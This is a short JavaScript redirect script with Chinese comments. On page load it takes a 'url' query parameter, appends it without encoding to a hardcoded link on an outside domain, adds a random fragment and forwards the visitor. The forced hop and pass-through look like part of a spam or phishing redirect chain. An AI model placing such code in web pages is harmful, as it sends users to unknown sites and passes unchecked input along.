// remote_script.js

// 获取 URL 参数
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const customParam = urlParams.get('url');

// 生成随机数字和英文组合 Fr0iy7UeDNxlynjswdEHIcalaTkv
const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母

// 构建跳转链接  https://p1.meiyintutu.com/s/27qq;3ssm7xj.html
let redirectURL = "https://p1.meiyintutu.com/s/278v2sssm7xj.html";

if (customParam) {
    redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
}

// 执行跳转
window.location.href = redirectURL;
